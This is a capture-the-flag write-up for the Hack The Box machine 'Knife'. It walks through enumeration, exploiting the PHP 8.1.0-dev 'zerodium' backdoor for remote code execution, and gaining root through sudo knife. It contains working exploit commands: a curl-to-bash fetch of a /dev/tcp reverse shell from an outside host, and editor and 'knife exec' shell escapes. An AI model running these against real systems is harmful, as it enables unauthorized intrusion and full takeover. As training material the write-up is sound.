# Knife - Linux, easy (10.10.10.242)

### Enumeration
```
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp   open     http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
4004/tcp filtered pxc-roid
5960/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A Gobuster scan reveals nothing, so let's try something else.

Sending a curl request to index.php we can observe the response headers `curl -I http://10.10.10.242/index.php` (-I: retrieves the headers only):
```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 16:53:03 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By` field reveals that the application is using **PHP/8.1.0-dev** version.

This version is vulnerable since this version was released with a backdoor, more details here [php-8.1.0-dev-backdoor.rce](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/).

Essentially, the code chekcs for the first occurrence of **zerodium** string in User-Agentt** request header. And if found, it execute the code after that string.
So, we can test this by making the following request using `curl`:
```
kali@kali:~/HackTheBox/retired/Linux/easy/Knife$ curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("id");' 
uid=1000(james) gid=1000(james) groups=1000(james)
...
```

It works! Let's get a reverse shell.

### Obtaining user James
Setup a python3 web server on port 80 and create index.html with `bash -i >& /dev/tcp/10.10.14.2/4444 0>&1` in it.
Start a netcat listener and then make the following curl request `curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("curl 10.10.14.2 | /bin/bash");'`.
```
james@knife:/$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
```

Get the first flag!

### Obtaining Root
Checking with `sudo -l` we can see that user James can run `/usr/bin/knife` as root:
```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Knife tool provides an interface to manage Chef automation server nodes, coockbooks, recipes and so on. Knife usage can be read from [manpage](https://manpages.ubuntu.com/manpages/bionic/man1/knife.1.html).

We can get a shell in two wasy mainly, the first one is by using vim while the second executing some perl code with knife.

### Mode 1
We can see from the manpage of knife some example, one of them shows that it is possible to edit knife data using a text editor, so we can try `sudo knide data bag create 1 2 -e vi`.
This will open up the vim editor! To get a shell as root, just type in vim `:!/bin/sh`.

### Mode 2
Search knife in [GTFOBins](https://gtfobins.github.io/gtfobins/knife/). It tells us that it can run ruby code, so we can execute the following command:
```
sudo knife exec -E 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)
```


